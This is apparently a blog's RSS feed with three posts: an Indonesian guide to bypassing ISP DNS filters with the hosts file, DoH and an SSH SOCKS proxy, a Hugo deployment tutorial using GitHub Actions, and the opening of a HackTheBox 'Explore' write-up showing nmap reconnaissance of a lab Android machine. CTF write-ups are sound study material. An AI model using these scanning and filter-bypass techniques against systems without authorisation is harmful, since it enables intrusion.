<p>Kita tahu bahwa alasan komputer kita membuat DNS kueri terlebih dahulu ke DNS server saat akan mengakses sebuah website adalah karena si komputer belum tau alamat IP dari website/domain yang kita maksud. Setelah si komputer tahu, alamat IP dan domain web ini akan di simpan pada DNS Resolver cache. Di <em>request</em> selanjutnya, si komputer akan mengandalkan daftar cache yang ada (selama belum <em>expired</em>).</p>
<p>Pada Windows, kita bisa melihat daftar IP dan nama domain yang sudah di cache dengan menjalankan perintah berikut.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\&gt;</span>ifconfig /displaydns
</code></pre></div><p>DNS server sendiri pada dasarnya hanyalah sekumpulan entry yang me-<em>mapping</em> alamat IP dengan nama domain secara dinamik. Pada level OS, terdapat sebuah file yang merupakan bentukan primivite dari DNS bersifat statik, yaitu file <code>hosts</code>.</p>
<p>File <code>hosts</code> Windows bisa ditemukan di <code>C:\Windows\System32\drivers\etc\hosts</code> sedangkan untuk Unix-like, file <code>hosts</code> terdapat di <code>/etc/hosts</code>. Karena saya pengguna Windows, yang akan di bahas disini adalah <code>hosts</code> file Windows saja.</p>
<figure>
    <img src="imgs/image-20211104123812239.png"
         alt="Windows hosts file"/> <figcaption>
            <p>Windows hosts file
            </p>
        </figcaption>
</figure>

<p>Pada Windows, file <code>hosts</code> ini akan selalu di-<em>load</em> ke dalam DNS Resolve cache, dan kita bisa memanfaatkan ini untuk memberi &lsquo;tau&rsquo; langsung komputer bahwa alamat IP, misalnya <code>www.reddit.com</code> adalah <code>151.101.129.140</code>, maka kita bisa menambahkan entry dengan format berikut ke dalam file <code>hosts</code> .</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"># [Alamat IP] [domain name 1] [domain name 2] [domain name N]
151.101.129.140 reddit.com www.reddit.com
</code></pre></div><p><div class="img-container"><img src="imgs/image-20211104131236469.png" alt="image-20211104131236469"  /></div>
</p>
<p>Sekarang kita jalankan kembali perintah yang sama untuk menampilkan DNS cache, tapi sebelumnya ada baiknya DNS cache ini diflush terlebih dulu.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\&gt;</span>ipconfig /flushdns <span class="c1"># clear cache dulu untuk menghilangkan brainwash dari DNS server ISP</span>
C:<span class="se">\&gt;</span>ipconfig /displaydns
</code></pre></div><p>Seharusnya saat ini <code>www.reddit.com</code> dan <code>reddit.com</code> berada di entry paling atas.</p>
<p>Karena si komputer sudah tau alamat IP dari <code>www.reddit.com</code>, maka dia tidak perlu lagi &ldquo;bertanya&rdquo; ke DNS server ISP.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ tracert -d www.reddit.com

Tracing route to reddit.com <span class="o">[</span>151.101.129.140<span class="o">]</span>
over a maximum of <span class="m">30</span> hops:

  <span class="m">1</span>   <span class="m">120</span> ms     <span class="m">2</span> ms     <span class="m">3</span> ms  192.168.43.1
  <span class="m">2</span>     *        *        *     Request timed out.
  <span class="m">3</span>   <span class="m">162</span> ms    <span class="m">26</span> ms    <span class="m">26</span> ms  10.***.44.2
  <span class="m">4</span>   <span class="m">160</span> ms    <span class="m">25</span> ms    <span class="m">30</span> ms  ***.215.36.238 
  <span class="m">5</span>   <span class="m">187</span> ms    <span class="m">46</span> ms    <span class="m">46</span> ms  180.87.12.233
  <span class="m">6</span>   <span class="m">186</span> ms    <span class="m">57</span> ms    <span class="m">50</span> ms  180.87.12.232
  <span class="m">7</span>   <span class="m">191</span> ms    <span class="m">49</span> ms    <span class="m">47</span> ms  180.87.12.250
  <span class="m">8</span>    <span class="m">49</span> ms    <span class="m">49</span> ms    <span class="m">48</span> ms  210.57.30.38
  <span class="m">9</span>   <span class="m">188</span> ms    <span class="m">53</span> ms    <span class="m">52</span> ms  202.84.219.174
 <span class="m">10</span>    <span class="m">70</span> ms    <span class="m">49</span> ms    <span class="m">52</span> ms  202.84.219.174
 <span class="m">11</span>    <span class="m">60</span> ms    <span class="m">54</span> ms    <span class="m">49</span> ms  202.84.224.197
 <span class="m">12</span>    <span class="m">83</span> ms    <span class="m">80</span> ms    <span class="m">85</span> ms  210.57.38.171
 <span class="m">13</span>   <span class="m">205</span> ms   <span class="m">200</span> ms   <span class="m">203</span> ms  151.101.129.140 

Trace complete.
</code></pre></div><p><em><strong>Kalau untuk website lain gimana?</strong></em></p>
<p>Google Toolbox!</p>
<p>Jadi kamu resolve dulu IPnya lewat Google Toolbox Dig.</p>
<p><div class="img-container"><img src="imgs/image-20211104142819468.png" alt="image-20211104142819468"  /></div>
</p>
<p>Maka di <code>hosts</code> filenya:</p>
<p><div class="img-container"><img src="imgs/image-20211104142858365.png" alt="image-20211104142858365"  /></div>
</p>
<h3 id="ssh-socks-proxy--doh">SSH SOCKS Proxy + DoH</h3>
<p>Penggunaan <code>host</code> file dan DoH memang bisa mem-<em>bypass</em> Website, tapi pihak ISP tetap bisa mengetahui kita mengakses situs dan domain apa.</p>
<p>Untuk menghindari itu, salah satu cara &lsquo;murah&rsquo; dan mudah yang saya gunakan selain VPN adalah menggunakan <em>private server</em> lalu memanfaatkan fitur builtin SOCKS <a href="https://en.wikipedia.org/wiki/Proxy_server">proxy</a> dari SSH (jatuhnya transparan). <em>Private server</em> ini saya deploy sendiri di Microsoft Azure.</p>
<p>Untuk memanfaatkan SSH tunnel sebagai SOCKS proxy, perintahnya cukup simple:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ ssh -i az_vm.key fproxy-user@20.109.***.213 -D <span class="m">1080</span> -N
</code></pre></div><ul>
<li><code>-D 1080</code>: Buka SOCKS proxy di port 1080 (listen)</li>
<li><code>-N</code>: Tanpa SSH interactive shell.</li>
</ul>
<p>Saat ini SOCKS Proxy via SSH sudah tersedia di 127.0.0.1:1080. Konfigurasinya di browser:</p>
<figure>
    <img src="imgs/image-20211104161049841.png"
         alt="Firefox proxy settings"/> <figcaption>
            <p>Firefox proxy settings
            </p>
        </figcaption>
</figure>

<p>Mudah kan?</p>
<p>Btw saya pakai ekstensi browser <a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">FoxyProxy</a>, supaya saat <em>switch on/off</em>-nya mudah dan gak harus buka-buka settingan browser, berikut tampilannya.</p>
<figure>
    <img src="imgs/image-20211104160902204.png"
         alt="FoxyProxy Toogle"/> <figcaption>
            <p>FoxyProxy Toogle
            </p>
        </figcaption>
</figure>

<p>Konfigurasinya? sama dengan settingan browser!</p>
<figure>
    <img src="imgs/image-20211104090204141.png"
         alt="Konfigurasi SOCKS Proxy di Foxy Proxy"/> <figcaption>
            <p>Konfigurasi SOCKS Proxy di Foxy Proxy
            </p>
        </figcaption>
</figure>

<p>Dengan mengirimkan <em>request</em> ke <code>ifconfig.co/json</code>, saat ini IP saya adalah IP dari si private server.</p>
<figure>
    <img src="imgs/image-20211104090145368.png"
         alt="Akses ifconfig.co dengan proxy"/> <figcaption>
            <p>Akses ifconfig.co dengan proxy
            </p>
        </figcaption>
</figure>

<p>Lalu ditambah dengan DoH dan di test lewat <a href="https://dnsleaktest.com/">https://dnsleaktest.com/</a>.</p>
<figure>
    <img src="imgs/image-20211104090533201.png"
         alt="Test DNS leak dengan DoH aktif"/> <figcaption>
            <p>Test DNS leak dengan DoH aktif
            </p>
        </figcaption>
</figure>

<p>Sampai sini seharusnya ISP kurang lebih hanya melihat komputer saya yang mengakses si private server dengan trafik seperti berikut.</p>
<figure>
    <img src="imgs/image-20211104152555436.png"
         alt="Web trafic yang terenkripsi melalui SSH tunnel"/> <figcaption>
            <p>Web trafic yang terenkripsi melalui SSH tunnel
            </p>
        </figcaption>
</figure>

<h2 id="conclusion">Conclusion</h2>
<p>Selain menggunakan VPN, setidaknya ada 3 solusi di postingan ini yang bisa kamu coba untuk bypass filters yang diterapkan oleh ISP langganan kamu:</p>
<ul>
<li>Hosts file,</li>
<li>DoH,</li>
<li>DoH+SSH SOCKS Proxy.</li>
</ul>
<p>Menggunakan hosts file dan DoH hanya sebatas menghindari komputer kita dari &ldquo;penipuan&rdquo; alamat palsu oleh DNS server ISP. Sedangkan DoH+SSH SOCKS Proxy selain menghindari &ldquo;penipuan&rdquo;, tunnel yang dibuat juga mengenkripsi keseluruhan trafik web kita.</p>
<p>Hasil <em>testing</em> ketiganya, bukan <em>testing</em> sih, bisa ditabelkan(?) seperti berikut.</p>
<div class="force-center">
<table>
<thead>
<tr>
<th></th>
<th>Bypass DNS filters</th>
<th>Hide the domain we visit ?</th>
</tr>
</thead>
<tbody>
<tr>
<td>Hosts file</td>
<td>Probably yes</td>
<td>No</td>
</tr>
<tr>
<td>DoH</td>
<td>Yes, mostly</td>
<td>No</td>
</tr>
<tr>
<td>DoH + SSH SOCKS Proxy</td>
<td>Yes, mostly, but it depends.</td>
<td>Yes</td>
</tr>
</tbody>
</table>
</div>
<p><em><strong>Apakah dengan ini saya sudah <del>bisa menjadi anggota</del> anonymous?</strong></em></p>
<p>Nope, karena private server yang saya pakai pun milik sesuatu yang lebih besar dari ISP dan dua-duanya mengumpulkan data juga.</p>
<p>Baiklah, sekian untuk postingan ini~</p>
<section class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p><a href="https://https.cio.gov/faq/#what-does-https-do">https://https.cio.gov/faq/#what-does-https-do</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</section>
]]></content:encoded>
    </item>
    
    <item>
      <title>Hugo Site Deployment With Github Actions</title>
      <link>https://fahmifj.github.io/blog/hugo-deployment-with-github-actions/</link>
      <pubDate>Mon, 01 Nov 2021 14:51:02 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/hugo-deployment-with-github-actions/</guid>
      <description>Applying a small part of Continuous Deployment to your Hugo site</description>
      <content:encoded><![CDATA[<p>This post is a continuation from my previous post about <a href="https://fahmifj.github.io/blog/hugo-setup-and-deployment/">Hugo Setup and Deployment</a>. In this post, we&rsquo;ll look into GitHub Actions.</p>
<p>First thing first, let&rsquo;s sum up what we did previously:</p>
<ul>
<li>We created a site and generated the site&rsquo;s HTML files (under <code>/public</code> folder) using Hugo.</li>
<li>We uploaded these HTML files to a GitHub repository called <code>my-blog</code>, and then we hosted the site by enabling GitHub Pages on that repo.</li>
<li>Lastly, we wrote a deployment script written in bash which can automatically generate and push the static HTML files to the GitHub repository.</li>
</ul>
<p>Using that way, we generate the site&rsquo;s static HTML files and then we push these newly generated files to the repository. So, there will be a bunch of HTML files generated on our machine over time, and we&rsquo;re going to upload them all each time we wish to update the site. That&rsquo;s why this is a waste.</p>
<p>So to avoid that, we&rsquo;ll employ GitHub Actions! Well, it basically does the same thing as we did, but, instead of using our own machine, we&rsquo;ll let GitHub VM/Docker instances do it for us.</p>
<p>I know that there are a lot of similar tutorials out there, but let me finish what I&rsquo;ve started!</p>
<h4 id="goals">Goals</h4>
<p>The only goal of this post is:</p>
<ul>
<li>Automate Site Deployment using GitHub Actions (I&rsquo;ll try my best to explain about it!)</li>
</ul>
<h4 id="prerequisites">Prerequisites</h4>
<p>Prerequisites are still the same, they are:</p>
<ul>
<li>A GitHub account</li>
<li>Familiarity with CLI</li>
<li>Familiarity with Git.</li>
</ul>
<h2 id="a-little-clean-up">A Little Clean Up</h2>
<p>Let&rsquo;s start by reviewing the previous site structure, here&rsquo;s where we (I) left it:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ tree -a -L <span class="m">2</span> -I <span class="s2">&#34;\.git&#34;</span>
.
├── .gitmodules
├── archetypes
│   └── default.md
├── config.yml
├── content
│   └── post
├── data
├── deploy.sh
├── layouts
├── public <span class="c1"># &lt;-- All files under this folder are hosted using GitHub Pages,</span>
│   ├── 404.html
│   ├── assets
│   ├── categories
│   ├── en
│   ├── fa
│   ├── fr
│   ├── index.html
│   ├── index.json
│   ├── index.xml
│   ├── page
│   ├── post
│   ├── robots.txt
│   ├── series
│   ├── sitemap.xml
│   └── tags
├── resources
│   └── _gen
├── static
└── themes
    └── PaperMod

<span class="m">20</span> directories, <span class="m">10</span> files
</code></pre></div><p>We&rsquo;ll now ignore the public folder and remove all of its content including the git repository inside it, because this will be handled by GitHub Actions later.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ rm ./public/* -r f
$ rm ./public/.git -rf
</code></pre></div><p>If you happen to use the <code>public</code> folder as a submodule, remove the following lines from <code>.git/config</code> and  <code>.gitmodules</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">[submodule &#34;public&#34;]
        url = https://github.com/your-username/my-blog.git
        active = true
</code></pre></div><p>Clean any cached content from the <code>public</code> folder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ git rm --cached ./public -f
</code></pre></div><p>Then go create another GitHub repository with the format <code>your-username.github.io</code> because we&rsquo;re going to use this repo as the remote repository of our blog.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ git remote add origin https://github.com/your-username/your-username.github.io.git
</code></pre></div><p>For the <code>config.yaml</code>, changed the baseURL value with:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">baseURL</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;https://your-username.github.io/&#34;</span><span class="w">
</span></code></pre></div><h2 id="add-the-theme-as-submodule">Add the Theme as Submodule</h2>
<p>If you happen to not using theme as submodule previously, this time we will.</p>
<p>Run the following command to add the PaperMod theme we cloned previously as a submodule of our site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ git submodule add https://github.com/adityatelange/hugo-PaperMod.git themes/PaperMod
</code></pre></div><p>If you don&rsquo;t use the same theme, simply replace the url and directory parts to match yours.</p>
<h2 id="add-github-actions">Add GitHub Actions</h2>
<p>On the previous post, we automated several things: site build, commit, and push our site to GitHub using a bash script. We can call the execution of this script as a <strong>workflow</strong> that runs a single <strong>job</strong>, it is to deploy our site. Each command executed within the deployment script (build, commit, push) can be referred as a <strong>step</strong>.</p>
<p>GitHub Actions are basically the advanced version of the deployment script we created. It&rsquo;s event-driven, which means we can set a specific event to trigger the workflow. In this case, we&rsquo;ll create an event that will trigger the site deployment each time we push a new commit to the main branch.</p>
<p>A workflow file for GitHub Actions must be written in YAML syntax, and it&rsquo;s placed under a special directory called <code>.github/workflows/[here].yml</code>, so let&rsquo;s create the folder first inside our site repository.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ mkdir -p ./.github/workflows
</code></pre></div><p>We&rsquo;ll save the following code under the workflow directory with a name <code>gh-pages.yml</code> (<code>./.github/workflows/gh-pages.yml</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">github pages</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="nt">on</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">push</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">branches</span><span class="p">:</span><span class="w">
</span><span class="w">      </span>- <span class="l">main </span><span class="w"> </span><span class="c"># Set a branch to deploy</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="nt">jobs</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">deploy</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">runs-on</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu-18.04</span><span class="w">
</span><span class="w">    </span><span class="nt">steps</span><span class="p">:</span><span class="w">
</span><span class="w">      </span>- <span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l">actions/checkout@v2</span><span class="w">
</span><span class="w">        </span><span class="nt">with</span><span class="p">:</span><span class="w">
</span><span class="w">          </span><span class="nt">submodules</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">  </span><span class="c"># Fetch Hugo themes (true OR recursive)</span><span class="w">
</span><span class="w">          </span><span class="nt">fetch-depth</span><span class="p">:</span><span class="w"> </span><span class="m">0</span><span class="w">    </span><span class="c"># Fetch all history for .GitInfo and .Lastmod</span><span class="w">
</span><span class="w">
</span><span class="w">      </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Setup Hugo</span><span class="w">
</span><span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l">peaceiris/actions-hugo@v2</span><span class="w">
</span><span class="w">        </span><span class="nt">with</span><span class="p">:</span><span class="w">
</span><span class="w">          </span><span class="nt">hugo-version</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;latest&#39;</span><span class="w">
</span><span class="w">          </span><span class="nt">extended</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span><span class="w">        
</span><span class="w">      </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Build </span><span class="w">
</span><span class="w">        </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="l">hugo --minify --cleanDestinationDir</span><span class="w">
</span><span class="w">
</span><span class="w">      </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Deploy</span><span class="w">
</span><span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l">peaceiris/actions-gh-pages@v3</span><span class="w">
</span><span class="w">        </span><span class="nt">with</span><span class="p">:</span><span class="w">
</span><span class="w">          </span><span class="nt">github_token</span><span class="p">:</span><span class="w"> </span><span class="l">${{ secrets.GITHUB_TOKEN }}</span><span class="w">
</span><span class="w">          </span><span class="nt">publish_dir</span><span class="p">:</span><span class="w"> </span><span class="l">./public</span><span class="w">
</span></code></pre></div><p>You can study the code yourself, because I&rsquo;m not the one who created it 😅. But, to make sure that the public folder always get cleaned first before build, I added <code>--cleanDestinationDir</code> option.</p>
<p>Let&rsquo;s commit this workflow and push it to GitHub.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ git add ./.github/workflows/gh-pages.yml
$ git commit -m <span class="s2">&#34;Add gh-pages.yml&#34;</span>
$ git push -u origin main
</code></pre></div><h2 id="trigger-the-workflow">Trigger the Workflow!</h2>
<p>We can create a new post, then add some text to it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ hugo new post/test-gh-actions.md
$ <span class="nb">echo</span> <span class="s1">&#39;Test GH Action&#39;</span> &gt;&gt; content/post/test-gh-actions.md
</code></pre></div><p>Finally, commit the change and push it to your repository to trigger the workflow</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ git commit -m <span class="s2">&#34;Trigger build&#34;</span>
$ git push -u origin main
</code></pre></div><p>To observe the deployment process/workflow, just navigate to your site repository and click on the action menu (<code>https://github.com/your-username/your-username.github.io/actions</code>).</p>
<p>That&rsquo;s it!</p>
<h2 id="my-current-deployment">My Current Deployment</h2>
<p>A bit off topic, but I&rsquo;ll show you my current deployment process, not in detail, but it should give you an idea of how it was like.</p>
<p>My deployment process a little bit different, because I&rsquo;ve separated my blog into two: blog-core, and the full static HTML site (it&rsquo;s this site). The blog-core is a private repo, and the full static HTML is a public repository. The blog-core repo contains my draft, notes, and other (a lot of them), which is only available for me locally because of <code>.gitignore</code>.</p>
<p>When a new commit is pushed on the blog-core, GitHub Actions will be triggered to generate the static HTML files. The newly generated HTML files are then pushed to the static site repo. I had to include my secret token in the blog-core so that GitHub Actions could use the token to authenticate itself.</p>
<p><div class="img-container"><img src="imgs/image-20211102111943965.png" alt="image-20211102111943965"  /></div>
</p>
<p>Note: these are not the actual commands.</p>
<p><del>I&rsquo;ll separate this section in a dedicated post later! nevermind lol</del></p>
<p>I found the blog post that explains about this</p>
<ul>
<li><a href="https://victoria.dev/blog/two-ways-to-deploy-a-public-github-pages-site-from-a-private-hugo-repository/">https://victoria.dev/blog/two-ways-to-deploy-a-public-github-pages-site-from-a-private-hugo-repository/</a></li>
</ul>
<p>And here&rsquo;s the Github Actions that I used</p>
<ul>
<li><a href="https://github.com/victoriadrake/hugo-remote">https://github.com/victoriadrake/hugo-remote</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Explore</title>
      <link>https://fahmifj.github.io/hackthebox/explore/</link>
      <pubDate>Sat, 30 Oct 2021 17:36:39 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/explore/</guid>
      <description>Exploiting ES File Explorer and abusing ADB</description>
      <content:encoded><![CDATA[<p>Explore features an ES File Explorer that is vulnerable to Arbitrary File Read, allowing me to obtain a picture containing SSH credentials. Enumerating the system reveals that the machine has debug mode enabled and ADB daemon running, these two can then be leveraged to obtain root access via ADB client.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Exploiting ES File Explorer vulnerability</li>
<li>Android enumeration and exploitation</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Adb</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>Nmap</code> scan on TCP ports discovers 5 open ports:</p>
<ul>
<li>SSH on port 2222</li>
<li>For port 5555, nmap identifies it as freeciv, but judging based on the OS, this can be ADB<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>.</li>
<li>The rest 37817, 42135, and 59777 are HTTP servers.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «explore» «10.10.14.32» 
$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/all-tcp-explorer 10.10.10.247
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-27 17:39 EDT
Nmap scan report <span class="k">for</span> 10.10.10.247
Host is up, received reset ttl <span class="m">63</span> <span class="o">(</span>0.057s latency<span class="o">)</span>.
Not shown: <span class="m">65530</span> closed ports
Reason: <span class="m">65530</span> resets
PORT      STATE    SERVICE      REASON
2222/tcp  open     EtherNetIP-1 syn-ack ttl <span class="m">63</span>
5555/tcp  filtered freeciv      no-response
37817/tcp open     unknown      syn-ack ttl <span class="m">63</span>
42135/tcp open     unknown      syn-ack ttl <span class="m">63</span>
59777/tcp open     unknown      syn-ack ttl <span class="m">63</span>

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 38.81 seconds
→ root@kali «explore» «10.10.14.32» 
$ nmap -p2222,5555,37817,42135,59777 -sC -sV -oA nmap/all-tcp-script-explorer 10.10.10.247         
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-27 17:47 EDT
Nmap scan report <span class="k">for</span> 10.10.10.247
Host is up <span class="o">(</span>0.051s latency<span class="o">)</span>.

PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     <span class="o">(</span>protocol 2.0<span class="o">)</span>
<span class="p">|</span> fingerprint-strings: 
<span class="p">|</span>   NULL: 
<span class="p">|</span>_    SSH-2.0-SSH Server - Banana Studio
<span class="p">|</span> ssh-hostkey: 
<span class="p">|</span>_  <span class="m">2048</span> 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb <span class="o">(</span>RSA<span class="o">)</span>
5555/tcp  filtered freeciv
37817/tcp open     unknown
<span class="p">|</span> fingerprint-strings: 
<span class="p">|</span>   GenericLines: 
<span class="p">|</span>     HTTP/1.0 <span class="m">400</span> Bad Request
<span class="p">|</span>     Date: Sun, <span class="m">27</span> Jun <span class="m">2021</span> 21:47:36 GMT
<span class="p">|</span>     Content-Length: <span class="m">22</span>
<span class="p">|</span>     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>US-ASCII
<span class="p">|</span>     Connection: Close
<span class="p">|</span>     Invalid request line:
<span class="p">|</span>   GetRequest: 
<span class="p">|</span>     HTTP/1.1 <span class="m">412</span> Precondition Failed
<span class="p">|</span>     Date: Sun, <span class="m">27</span> Jun <span class="m">2021</span> 21:47:36 GMT
<span class="p">|</span>     Content-Length: <span class="m">0</span>
<span class="p">|</span>   HTTPOptions: 
<span class="p">|</span>     HTTP/1.0 <span class="m">501</span> Not Implemented
<span class="p">|</span>     Date: Sun, <span class="m">27</span> Jun <span class="m">2021</span> 21:47:41 GMT
<span class="p">|</span>     Content-Length: <span class="m">29</span>
<span class="p">|</span>     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>US-ASCII
<span class="p">|</span>     Connection: Close
<span class="p">|</span>     Method not supported: OPTIONS
<span class="p">|</span>   Help: 
<span class="p">|</span>     HTTP/1.0 <span class="m">400</span> Bad Request
<span class="p">|</span>     Date: Sun, <span class="m">27</span> Jun <span class="m">2021</span> 21:47:57 GMT
<span class="p">|</span>     Content-Length: <span class="m">26</span>
<span class="p">|</span>     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>US-ASCII
<span class="p">|</span>     Connection: Close
<span class="p">|</span>     Invalid request line: HELP
<span class="p">|</span>   RTSPRequest: 
<span class="p">|</span>     HTTP/1.0 <span class="m">400</span> Bad Request
<span class="p">|</span>     Date: Sun, <span class="m">27</span> Jun <span class="m">2021</span> 21:47:41 GMT
<span class="p">|</span>     Content-Length: <span class="m">39</span>
<span class="p">|</span>     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>US-ASCII
<span class="p">|</span>     Connection: Close
<span class="p">|</span>     valid protocol version: RTSP/1.0
<span class="p">|</span>   SSLSessionReq: 
<span class="p">|</span>     HTTP/1.0 <span class="m">400</span> Bad Request
<span class="p">|</span>     Date: Sun, <span class="m">27</span> Jun <span class="m">2021</span> 21:47:57 GMT
<span class="p">|</span>     Content-Length: <span class="m">73</span>
<span class="p">|</span>     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>US-ASCII
<span class="p">|</span>     Connection: Close
<span class="p">|</span>     Invalid request line: 
<span class="p">|</span>     ?G???,???<span class="sb">`</span>~?
<span class="p">|</span>     ??<span class="o">{</span>????w????&lt;<span class="o">=</span>?o?
<span class="p">|</span>   TLSSessionReq: 
<span class="p">|</span>     HTTP/1.0 <span class="m">400</span> Bad Request
<span class="p">|</span>     Date: Sun, <span class="m">27</span> Jun <span class="m">2021</span> 21:47:57 GMT
<span class="p">|</span>     Content-Length: <span class="m">71</span>
<span class="p">|</span>     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>US-ASCII
<span class="p">|</span>     Connection: Close
<span class="p">|</span>     Invalid request line: 
<span class="p">|</span>     ??random1random2random3random4
<span class="p">|</span>   TerminalServerCookie: 
<span class="p">|</span>     HTTP/1.0 <span class="m">400</span> Bad Request
<span class="p">|</span>     Date: Sun, <span class="m">27</span> Jun <span class="m">2021</span> 21:47:57 GMT
<span class="p">|</span>     Content-Length: <span class="m">54</span>
<span class="p">|</span>     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>US-ASCII
<span class="p">|</span>     Connection: Close
<span class="p">|</span>     Invalid request line: 
<span class="p">|</span>_    Cookie: <span class="nv">mstshash</span><span class="o">=</span>nmap
42135/tcp open     http    ES File Explorer Name Response httpd
<span class="p">|</span>_http-title: Site doesn<span class="s1">&#39;t have a title (text/html).
</span><span class="s1">59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
</span><span class="s1">|_http-title: Site doesn&#39;</span>t have a title <span class="o">(</span>text/plain<span class="o">)</span>.
<span class="m">2</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
<span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
SF-Port2222-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>6/27%Time<span class="o">=</span>60D8F1F8%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NU
SF:LL,24,<span class="s2">&#34;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&#34;</span><span class="o">)</span><span class="p">;</span>
<span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
SF-Port37817-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>6/27%Time<span class="o">=</span>60D8F1F8%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>G
SF:enericLines,AA,<span class="s2">&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Sun,\x20
</span><span class="s2">
</span><span class="s2">...[SNIP]...
</span><span class="s2">
</span><span class="s2">Service Info: Device: phone
</span><span class="s2">
</span><span class="s2">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class="s2">Nmap done: 1 IP address (1 host up) scanned in 105.79 seconds
</span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-37817">TCP 37817</h3>
<p>No reply given from 37817, it showed in a close state when I tried to rescan it.</p>
<h3 id="tcp-59777--42135---es-file-explorer">TCP 59777 &amp; 42135 - ES File Explorer</h3>
<p>If I search for port 59777 and 42135 on Google, the results show that these ports are belong to ES File Explorer.</p>
<p>Interacting with port 59777 from the browser gives me the response below, and no further information given.</p>
